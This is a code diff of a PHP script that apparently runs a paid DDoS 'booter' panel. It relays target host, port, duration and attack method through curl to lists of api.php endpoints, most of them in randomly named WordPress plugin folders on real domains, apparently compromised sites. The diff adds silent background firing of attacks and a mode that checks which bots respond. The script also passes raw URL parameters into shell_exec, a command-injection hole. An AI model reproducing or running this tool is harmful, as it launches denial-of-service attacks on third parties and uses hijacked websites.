@@ -6,10 +6,21 @@ error_reporting(-1);
 $free = array("https://birsufm.com/api.php", "https://citymovers.co.nz/wp-content/plugins/cndnfhuwek/api.php");
 
 $paid = array(
-    "https://3-upstesting.site/api.php", "https://gridermarketing.com/wp-admin/api.php", "https://clinicapequenosanjos.com.br/wp-admin/api.php", "http://casinonextyear19.com/wp-admin/api.php", "https://totomtpolice.com/wp-admin/api.php", "https://services365.ca/wp-content/plugins/wvfhjwxtei/api.php", "https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php", "https://co-branding.co.nz/wp-content/plugins/vdpqlwveqc/api.php", "http://guvenveroline.com/wp-content/plugins/vugkgazcpj/api.php", "https://touchofthetropics.co.nz/wp-content/plugins/pnrjbnwzyj/api.php", "https://brockinteriorsltd.com/test/wp-content/plugins/pqcpcyldhr/api.php", "https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php", "https://constructionnewshubb.com/wp-content/plugins/kjnzakirfr/api.php", "http://ebikes.wdemo.in/admin/controller/extension/extension/api.php", "https://www.developershopon.com/wp-admin/api.php", "https://www.ultrapetsupplies.co.nz/wp-content/plugins/ybdioxgbdu/api.php"
+    "https://3-upstesting.site/api.php",
+    "https://totomtpolice.com/wp-admin/api.php",
+    "https://services365.ca/wp-content/plugins/wvfhjwxtei/api.php",
+    "https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php",
+    "https://co-branding.co.nz/wp-content/plugins/vdpqlwveqc/api.php",
+    "http://guvenveroline.com/wp-content/plugins/vugkgazcpj/api.php",
+    "https://touchofthetropics.co.nz/wp-content/plugins/pnrjbnwzyj/api.php",
+    "https://brockinteriorsltd.com/test/wp-content/plugins/pqcpcyldhr/api.php",
+    "https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php",
+    "http://ebikes.wdemo.in/admin/controller/extension/extension/api.php",
+    // "https://www.developershopon.com/wp-admin/api.php",
+    "https://www.cerebellumcounselling.com/wp-content/plugins/tsftuvbvmu/api.php"
 );
 
-$digital = array('http://164.92.244.96/api.php');
+$digital = array();
 
 $full = array_merge($paid, $free, $digital);
 
@@ -21,6 +32,7 @@ $port = intval($_GET['port']);
 $time = intval($_GET['time']);
 $method = $_GET['method'];
 $list = $_GET['list'];
+$debug = isset($_GET['debug']) ? 1 : 0;
 
 $lists = array("free", "paid", "digital", "full");
 $ray = array("7ed408c442ecdf2a8e16398a6f05355c");
@@ -85,6 +97,7 @@ switch ($list) {
         break;
     case "paid":
         $servers = $paid;
+        break;
     case "digital":
         $servers = $digital;
         break;
@@ -93,9 +106,56 @@ switch ($list) {
         break;
 }
 
+function execInBackground($cmd)
+{
+    if (substr(php_uname(), 0, 7) == "Windows") {
+        pclose(popen("start /B " . $cmd, "r"));
+    } else {
+        exec($cmd . " > /dev/null &");
+    }
+}
+
+if ($method == "check") {
+    $w = 0;
+    foreach ($servers as $i => $url) {
+        $cmd = "curl -X GET \"$url\"";
+        $a = shell_exec($cmd);
+        if ($a == "Error: API key is empty!") {
+            $w++;
+            echo "<a style='color:green'>$url: Working</a><br>";
+        } else {
+            echo "<a style='color:red'>$url: Not Working</a><br>";
+        }
+    }
+    $serlen = count($servers);
+    die("Working: $w/$serlen");
+}
+
 foreach ($servers as $i => $url) {
     $params = "?host=$host&port=$port&time=$time&key=$key&method=$method";
     $to_req =  $url . $params;
-    $a = shell_exec("curl -X GET \"$to_req\"");
-    echo "<a style='color:green'>$to_req</a><br>$a<br>";
+    $cmd = "curl -X GET \"$to_req\"";
+    if ($debug) {
+        $a = shell_exec($cmd);
+        echo "<a style='color:green'>$to_req</a><br>$a<br>";
+    } else {
+        execInBackground($cmd);
+    }
+}
+
+$current_version = file_get_contents('version.txt');
+
+if ($update == "update") {
+    $w = 0;
+    foreach ($servers as $i => $url) {
+        $url = str_replace($url, "api.php", "version.txt");
+        $cmd = "curl -X GET \"$url\"";
+        $a = shell_exec($cmd);
+        if ($current_version != $a) {
+            echo "<a style='color:green'>$url: $a</a><br>";
+        } else {
+            echo "<a style='color:red'>$url: $a</a><br>";
+        }
+    }
+    $serlen = count($servers);
 }
